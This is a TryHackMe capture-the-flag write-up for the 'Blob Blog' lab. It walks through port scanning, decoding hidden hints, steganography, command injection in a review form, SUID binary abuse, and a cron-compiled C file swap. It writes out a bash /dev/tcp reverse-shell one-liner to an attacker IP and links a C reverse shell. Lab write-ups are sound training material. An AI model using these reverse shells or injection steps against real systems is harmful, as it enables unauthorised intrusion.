---
published: true
title: Blob Blog - TryHackMe Walkthrough
author: F3dai
category: Writeup
image: 'https://imgur.com/nGqQo9T.png'
---
Blob - "Successfully hack into bobloblaw's computer" This is a TryHackMe box. To access this you must sign up to [https://tryhackme.com/](https://tryhackme.com/).

**URL:** [The Blob Blog](https://tryhackme.com/room/theblobblog)

**Difficulty:** Medium

**Author:** bobbloblaw

## Enumeration

I've added the IP to /etc/hosts as blob.thm. Let's run a portscan with the following command:

<pre>sudo nmap -v -sV -sS -p- -T4 -sC -oN portscan blob.thm</pre>

Here is the result:

<pre>PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 e7:28:a6:33:66:4e:99:9e:8e:ad:2f:1b:49:ec:3e:e8 (DSA)
|   2048 86:fc:ed:ce:46:63:4d:fd:ca:74:b6:50:46:ac:33:0f (RSA)
|   256 e0:cc:05:0a:1b:8f:5e:a8:83:7d:c3:d2:b3:cf:91:ca (ECDSA)
|_  256 80:e3:45:b2:55:e2:11:31:ef:b1:fe:39:a8:90:65:c5 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</pre>

2 standard ports we can expect to see open. Let's enumerate port 80:

![apache](https://imgur.com/BOsKpYJ.png)

We have the default apache2 page.

I run a directory scan but don't get anything interesting. 

Let's move onto a bigger wordlist, I used one from seclist:

<pre>wfuzz -w /home/user/Documents/SecLists/Discovery/Web-Content/big.txt --hc 404,403 http://blob.thm/FUZZ</pre>

Still no result, so I have a look at the actual web page itself and find this in the source code:

<pre>&lt;!--
K1stLS0+Kys8XT4rLisrK1stPisrKys8XT4uLS0tLisrKysrKysrKy4tWy0+KysrKys8XT4tLisrKytbLT4rKzxdPisuLVstPisrKys8XT4uLS1bLT4rKysrPF0+LS4tWy0+KysrPF0+LS4tLVstLS0+KzxdPi0tLitbLS0tLT4rPF0+KysrLlstPisrKzxdPisuLVstPisrKzxdPi4tWy0tLT4rKzxdPisuLS0uLS0tLS0uWy0+KysrPF0+Li0tLS0tLS0tLS0tLS4rWy0tLS0tPis8XT4uLS1bLS0tPis8XT4uLVstLS0tPis8XT4rKy4rK1stPisrKzxdPi4rKysrKysrKysrKysuLS0tLS0tLS0tLi0tLS0uKysrKysrKysrLi0tLS0tLS0tLS0uLS1bLS0tPis8XT4tLS0uK1stLS0tPis8XT4rKysuWy0+KysrPF0+Ky4rKysrKysrKysrKysrLi0tLS0tLS0tLS0uLVstLS0+KzxdPi0uKysrK1stPisrPF0+Ky4tWy0+KysrKzxdPi4tLVstPisrKys8XT4tLi0tLS0tLS0tLisrKysrKy4tLS0tLS0tLS0uLS0tLS0tLS0uLVstLS0+KzxdPi0uWy0+KysrPF0+Ky4rKysrKysrKysrKy4rKysrKysrKysrKy4tWy0+KysrPF0+LS4rWy0tLT4rPF0+KysrLi0tLS0tLS4rWy0tLS0+KzxdPisrKy4tWy0tLT4rKzxdPisuKysrLisuLS0tLS0tLS0tLS0tLisrKysrKysrLi1bKys+LS0tPF0+Ky4rKysrK1stPisrKzxdPi4tLi1bLT4rKysrKzxdPi0uKytbLS0+KysrPF0+LlstLS0+Kys8XT4tLS4rKysrK1stPisrKzxdPi4tLS0tLS0tLS0uWy0tLT4rPF0+LS0uKysrKytbLT4rKys8XT4uKysrKysrLi0tLS5bLS0+KysrKys8XT4rKysuK1stLS0tLT4rPF0+Ky4tLS0tLS0tLS0uKysrKy4tLS4rLi0tLS0tLS4rKysrKysrKysrKysrLisrKy4rLitbLS0tLT4rPF0+KysrLitbLT4rKys8XT4rLisrKysrKysrKysrLi4rKysuKy4rWysrPi0tLTxdPi4rK1stLS0+Kys8XT4uLlstPisrPF0+Ky5bLS0tPis8XT4rLisrKysrKysrKysrLi1bLT4rKys8XT4tLitbLS0tPis8XT4rKysuLS0tLS0tLitbLS0tLT4rPF0+KysrLi1bLS0tPisrPF0+LS0uKysrKysrKy4rKysrKysuLS0uKysrK1stPisrKzxdPi5bLS0tPis8XT4tLS0tLitbLS0tLT4rPF0+KysrLlstLT4rKys8XT4rLi0tLS0tLi0tLS0tLS0tLS0tLS4tLS1bLT4rKysrPF0+Li0tLS0tLS0tLS0tLS4tLS0uKysrKysrKysrLi1bLT4rKysrKzxdPi0uKytbLS0+KysrPF0+Li0tLS0tLS0uLS0tLS0tLS0tLS0tLi0tLVstPisrKys8XT4uLS0tLS0tLS0tLS0tLi0tLS4rKysrKysrKysuLVstPisrKysrPF0+LS4tLS0tLVstPisrPF0+LS4tLVstLS0+Kys8XT4tLg==
--&gt;</pre>

This looks like base64, so I use cyberchef to decode this:

[CyberChef - Github](https://gchq.github.io/CyberChef)

![cyberchef](https://imgur.com/1SuJtY1.png)

We get something else that is encoded. This is a programming language called Brainfuck. Use this website to decode the language:

[Decode Brainfuck - dcode.fr](https://www.dcode.fr/brainfuck-language)

Result:

<pre>When I was a kid, my friends and I would always knock on 3 of our neighbours doors.  Always houses 1, then 3, then 5!</pre>

Doesn't seem to be much information here? Maybe it's a rabbit hole.

There is another comment in the apache default page source code (right at the end):

<pre>&lt;!--
Dang it Bob, why do you always forget your password?
I'll encode for you here so nobody else can figure out what it is: 
HcfP8J54AK4
--&gt;</pre>

He says it's encoded, it's probably base something so let's go to cyberchef again. Base58 seemed to work:

![base58](https://imgur.com/v51hS33.png)

<pre>cUpC4k3s</pre>

At this point I feel I am missing something, the challenge is called **The Blob Blog**, and I haven't seen a blog? Is there something hidden that I can't see right now? 

The first quote we saw that was encoded with Brainfuck mentions something about knocking and gives us 3 numbers. Maybe this hints towards port knocking?

Let's try the following command: 

<pre>sudo knock blob.thm 1 3 5</pre>

Let's run a portscan again:

<pre>sudo nmap -v -sV -sS -p- -T4 -sC -oN portscan blob.thm</pre>

We managed to open up a new port:

<pre>PORT     STATE    SERVICE VERSION
21/tcp   open     ftp     vsftpd 3.0.2
22/tcp   open     ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 e7:28:a6:33:66:4e:99:9e:8e:ad:2f:1b:49:ec:3e:e8 (DSA)
|   2048 86:fc:ed:ce:46:63:4d:fd:ca:74:b6:50:46:ac:33:0f (RSA)
|   256 e0:cc:05:0a:1b:8f:5e:a8:83:7d:c3:d2:b3:cf:91:ca (ECDSA)
|_  256 80:e3:45:b2:55:e2:11:31:ef:b1:fe:39:a8:90:65:c5 (ED25519)
80/tcp   open     http    Apache httpd 2.4.7 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
445/tcp  open     http    Apache httpd 2.4.7 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
5355/tcp filtered llmnr
8080/tcp open     http    Werkzeug httpd 1.0.1 (Python 3.5.3)
| http-methods: 
|_  Supported Methods: HEAD GET OPTIONS
|_http-server-header: Werkzeug/1.0.1 Python/3.5.3
|_http-title: Apache2 Ubuntu Default Page: It works
</pre>

Port 8080 is another Apache default page so let's do another directory scan:

<pre>wfuzz -u http://blob.thm:8080/FUZZ -w /usr/share/wordlists/wfuzz/general/big.txt -c --hc 404,403</pre>

Result:

![wfuzz](https://imgur.com/YsFKp0B.png)

Wfuzz found /login:

![/login](https://imgur.com/vhJh9B2.png)

I tried using the password we have for bob, but no luck.

## User

No luck on port 21 either (ftp).

445 looks like another Apache default page with something interesting in the source code:

<pre>&lt;!--
Bob, I swear to goodness, if you can't remember p@55w0rd
It's not that hard
--&gt;</pre>

Cool, we have another password for something. I'd like to enumerate port 445 before we start trying to authenticate ourselves on something (in case we miss something)

Let's do a web directory scan on port 445:

<pre>wfuzz -u http://blob.thm:445/FUZZ -w /usr/share/wordlists/wfuzz/general/big.txt -c --hc 404,403</pre>

<pre>===================================================================
ID           Response   Lines    Word     Chars       Payload                      
===================================================================

000002838:   200        49 L     55 W     3401 Ch     "user"                       
</pre>

We got /user. This is an OpenSSH private key we could try and use to connect via ssh. Let's download this key:

<pre>wget http://blob.thm:445/user
chmod 700 user
ssh bob@blob.thm -i user</pre>

But we get an error:

<pre>load pubkey "user": invalid format
Load key "user": invalid format</pre>

Let's try accessing the ftp server:

<pre>┌─[user@parrot]─[~/tryhackme/BlobBlog]
└──╼ $ftp blob.thm
Connected to blob.thm.
220 (vsFTPd 3.0.2)
Name (blob.thm:user): bob
331 Please specify the password.
Password: (cUpC4k3s)
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; </pre>

Make sure you enable passive mode: 

<pre>ftp&gt; passive
Passive mode on.
ftp&gt; ls
227 Entering Passive Mode (10,10,30,54,82,142).
150 Here comes the directory listing.
-rw-r--r--    1 1001     1001         8980 Jul 25 14:07 examples.desktop
dr-xr-xr-x    3 65534    65534        4096 Jul 25 14:08 ftp
226 Directory send OK.
ftp&gt; </pre>

Transfer everything over with GET <file>.

We have 2 files:

**cool.jpeg**

This could be steganography, running steghide prompts is with a password. I used the most recent one we found (p@55w0rd)

<pre>┌─[user@parrot]─[~/tryhackme/BlobBlog/ftp]
└──╼ $steghide info cool.jpeg 
"cool.jpeg":
  format: jpeg
  capacity: 423.0 Byte
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "out.txt":
    size: 43.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes</pre>

Nice, there is a file called out.txt embedded in the image. Let's extract it.

<pre>steghide extract -sf cool.jpeg</pre>

We got some information:

<pre>┌─[user@parrot]─[~/tryhackme/BlobBlog/ftp]
└──╼ $cat out.txt 
zcv:p1fd3v3amT@55n0pr
/bobs_safe_for_stuff
</pre>

The examples.desktop seem to be an unrelated system file. 

I found a web directory on port 445 with this file path:

<pre>http://blob.thm:445/bobs_safe_for_stuff</pre>

<pre>Remember this next time bob, you need it to get into the blog! I'm taking this down tomorrow, so write it down!
- youmayenter
</pre>

These credentials may be needed for authenticating ourselves for the blog? Let's try using this on the login page we found on port 8080 (http://blob.thm:8080/login).

No luck, could this be encrypted? Is zcv = bob? If so, it's probably a shift cypher.

I tried a few different algorithms and found the vigenere cypher worked best:

[Cigenere Cipher - dcode.fr](https://www.dcode.fr/vigenere-cipher)

You need a key, maybe **youmayenter**? 

Using that as the key/password, we get the following text:

<pre>bob:d1ff3r3ntP@55w0rd</pre>

We can use this to authenticate ourselves on the web page. 

![auth blog](https://imgur.com/6pxib6V.png)

We have an option to leave a review, which should be seen at /review.

Let's see if this is vulnerable to RCE. I enter "pwd".

We get:

<pre>/var/www/html2 </pre>

Looks like it is, so let's try and get a reverse shell. 

Here is a useful page that compiles all the important reverse shell "one-liners" that you should be aware of:

[Reverse Shell Cheatsheet - CyberGoat](/cheatsheet/Reverse_Payload_Cheatsheet/)

First listen to whatever port with netcat:

<pre>┌─[user@parrot]─[~/tryhackme/BlobBlog/ftp]
└──╼ $nc -nvlp 4444
listening on [any] 4444 ...</pre>

I'll use the following command: 

<pre>bash -i >& /dev/tcp/10.8.98.109/4444 0>&1</pre>

We are logged in as www-data:

<pre>www-data@bobloblaw-VirtualBox:~/html2$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre>

We have 2 users on the machine:

<pre>www-data@bobloblaw-VirtualBox:~/html2$ cd /home
www-data@bobloblaw-VirtualBox:/home$ ls -la

total 16
drwxr-xr-x  4 root      root      4096 Jul 25 14:07 .
drwxr-xr-x 25 root      root      4096 Jul 28 17:13 ..
dr-xr-xr-x  3 bob       bob       4096 Jul 25 14:08 bob
drwxrwx--- 16 bobloblaw bobloblaw 4096 Aug  6 14:51 bobloblaw
</pre>

Let's check if we can do some privesc. Look for SUID binaries:

<pre>find / -perm -4000 2>/dev/null</pre>

<pre>/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/ubuntu-app-launch/oom-adjust-setuid-helper
/usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/sbin/pppd
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/traceroute6.iputils
/usr/bin/chsh
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/arping
/usr/bin/blogFeedback
/usr/bin/passwd
/bin/ntfs-3g
/bin/su
/bin/fusermount
/bin/mount
/bin/ping
/bin/umount
/opt/VBoxGuestAdditions-6.1.12/bin/VBoxDRMClient</pre>

The one which sticks out is blogFeedback as this is not native. Let's check it out by transferring this binary to our local machine:

<pre>cp /usr/bin/blogFeedback /var/www/html</pre>

Let's install it by visiting http://blob.thm/blogFeedback

I ran the following command:

<pre>strings blogFeedback | less</pre>

We can see some potentially interesting stuff going on so I'd like to analyse this more with a tool called Ghidra. 

[Ghidra website - Download link](https://ghidra-sre.org/)

For installing, just unzip and run the binary (./ghidraRun), make a project, import the binary and analyse the code. Make sure you have the binary file selected.

![ghidra](https://imgur.com/GICiRIG.png)

Let's check out our functions under "symbol tree". I find the main function which shows us some code:

![main function](https://imgur.com/RfD7ryD.png)

<pre>undefined8 main(int param_1,long param_2)

{
  int iVar1;
  int local_c;
  
  if ((param_1 &lt; 7) || (7 &lt; param_1)) {
    puts(&quot;Order my blogs!&quot;);
  }
  else {
    local_c = 1;
    while (local_c &lt; 7) {
      iVar1 = atoi(*(char **)(param_2 + (long)local_c * 8));
      if (iVar1 != 7 - local_c) {
        puts(&quot;Hmm... I disagree!&quot;);
        return 0;
      }
      local_c = local_c + 1;
    }
    puts(&quot;Now that, I can get behind!&quot;);
    setreuid(1000,1000);
    system(&quot;/bin/sh&quot;);
  }
  return 0;
}</pre>

It looks like local_c could be an array of our arguments when executing the binary. Entering 6 parameters gives us the response *"Hmm... I disagree!"*.

We need to look at the while loop and how it checks each iteration. It's essentially checking each position of the array (our arguments) to see if it is **not** = 7 - 1 (incramenting the 1 each iteration). So we can expect it to check out like this:

- Is x != 7 - 1 
- Is x != 7 - 2
- Is x != 7 - 3 
- Is x != 7 - 4

etc.

So picking these numbers would help us get user escalation:

<pre>/usr/bin/blogFeedback 6 5 4 3 2 1</pre>

We are now on user bobloblaw, who has user.txt in their Desktop directory. 

## Root

I upgrade my shell with the following command:

<pre>python -c 'import pty; pty.spawn("/bin/bash")'</pre>

I check sudo rights:

<pre>bobloblaw@bobloblaw-VirtualBox:/$ sudo -l
sudo -l
Matching Defaults entries for bobloblaw on bobloblaw-VirtualBox:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bobloblaw may run the following commands on bobloblaw-VirtualBox:
    (root) NOPASSWD: /bin/echo, /usr/bin/yes
</pre>

I decided to generate a key to add to bobloblaw's ssh authorized keys. 

<pre>echo "ssh-rsa AAAAB3Nz....Z9cwRc= user@parrot" > authorized_keys</pre>

Now we have a better shell, I'd like to check the cronjobs, there is a really annoying script that is printing out "You haven't rooted me yet? Jeez" frequently. I'm thinking we could use our sudo echo along with whatever scripts are running as root to gain root privileges. 

<pre>less /etc/crontab</pre>

We see this:

<pre>root    cd /home/bobloblaw/Desktop/.uh_oh && tar -zcf /tmp/backup.tar.gz *</pre>

There is a known exploit for this but I was first interested in the two files in Desktop:

dontlookatthis.jpg  and lookatme.jpg

Let's transfer them over to our local machine. I'll use SCP with the private key I generated earlier with ssh-keygen.

<pre>scp -i bob bobloblaw@blob.thm:/home/bobloblaw/Desktop/* .</pre>

I managed to extract a file called dontlook.txt from dontlookatthis.jpg with no password.

Here is what is in the file:

<pre>NDkgMjAgNzQgNmYgNmMgNjQgMjAgNzkgNmYgNzUgMjAgNmUgNmYgNzQgMjAgNzQgNmYgMjAgNmMgNmYgNmYgNmIgMjE=</pre>

Let's decode this from base64:

<pre>┌─[user@parrot]─[~/tryhackme/BlobBlog]
└──╼ $echo NDkgMjAgNzQgNmYgNmMgNjQgMjAgNzkgNmYgNzUgMjAgNmUgNmYgNzQgMjAgNzQgNmYgMjAgNmMgNmYgNmYgNmIgMjE= | base64 -d
49 20 74 6f 6c 64 20 79 6f 75 20 6e 6f 74 20 74 6f 20 6c 6f 6f 6b 21</pre>

Hex?

<pre>I told you not to look!</pre>

Cool, let's move onto the next image. This is probably a rabbit hole.

<pre>steghide extract -sf lookatme.jpg</pre>

No password is needed, we get a file called whatscooking.txt. Looks like binary. Convert from binary, we get this:

<pre>KysrKysrKysrK1s+Kz4rKys+KysrKysrKz4rKysrKysrKysrPDw8PC1dPj4+KysrKysrKysrKysrKysuPisrKysuLS0tLjw8KysuPj4rKysrKysrKysrKysrKy4rLi0tLS0tLisrKysrKysuPCsrKysrKysrKysrKysrKysrLjwrKysrKysrLj4+LS0tLjw8LS0tLS0tLS4+PisuPCsrKysuKysrKy4tLS0tLS0tLS4+LS0uPDwuPisrKysuPisuPDwuPi0tLS0tLS0tLisuPi0tLS0uKysrKysrLi0uPDwuPj4uLS0tLS0uPDwuPisrKysrLj4uPDwuPj4uPC0uLjwrKysrKysrKysrKysrKy4uLi0tLS0tLS0tLS0tLS0tLj4+KysrKysuPCsrLi0tLS4+LS0uPC48Lj4tLS0tLj4uPCsrKysuPC4+PisuLS0tLS4tLS48LjwuPj4rKy4rKysrKy48KysrLi0tLS4+LS0uPDwuPj4rKy48KysrKy4rKysrLi0tLS0tLS0tLj4tLS4rLjw8Lj4+Ky4tLS0tLS4uPDwrKysrKysrKysrKysrKy4uLg==</pre>

Convert from base64, we get this:

<pre>++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;++++++++++++++.&gt;++++.---.&lt;&lt;++.&gt;&gt;++++++++++++++.+.-----.+++++++.&lt;+++++++++++++++++.&lt;+++++++.&gt;&gt;---.&lt;&lt;-------.&gt;&gt;+.&lt;++++.++++.--------.&gt;--.&lt;&lt;.&gt;++++.&gt;+.&lt;&lt;.&gt;--------.+.&gt;----.++++++.-.&lt;&lt;.&gt;&gt;.-----.&lt;&lt;.&gt;+++++.&gt;.&lt;&lt;.&gt;&gt;.&lt;-..&lt;++++++++++++++...--------------.&gt;&gt;+++++.&lt;++.---.&gt;--.&lt;.&lt;.&gt;----.&gt;.&lt;++++.&lt;.&gt;&gt;+.----.--.&lt;.&lt;.&gt;&gt;++.+++++.&lt;+++.---.&gt;--.&lt;&lt;.&gt;&gt;++.&lt;++++.++++.--------.&gt;--.+.&lt;&lt;.&gt;&gt;+.-----..&lt;&lt;++++++++++++++...</pre>

Decode from brainfuck, we get this:

<pre>The stove's timer is about to go off... there are some other timers too...</pre>

Not sure how this is useful but we will continue. I run a recursive directory list (it was quite large so I simplified it with less):

<pre>ls -laR | less</pre>

I can see the script which is printing those annoying messages:

There is a binary file owned by root in ~/Documents/.also_boring. 

There is also a c file in ~/Documents called .boring_file.c, owned by our current user. I'm going to take a guess and say that the .c file is being compiled and executed by root. 

<pre>#include &lt;stdio.h&gt;
int main() {
	printf(&quot;You haven't rooted me yet? Jeez\n&quot;);
	return 0;

}</pre>

If so, let's just replace the contents of .boring_file.c with our payload so it can be executed by root. I'll be using this simple one:

[simple C reverse shell - Github](https://gist.github.com/0xabe-io/916cf3af33d1c0592a90)

Replace the ServIP and ServPort with your own machine's details and set up a netcat listener:

<pre>┌─[user@parrot]─[~/tryhackme/BlobBlog]
└──╼ $nc -nvlp 5555
listening on [any] 5555 ...
connect to [10.8.98.105] from (UNKNOWN) [10.10.139.32] 45748
ls
root.txt</pre>

After a few moments, we are logged in as root :) The flag can be found in /root/root.txt
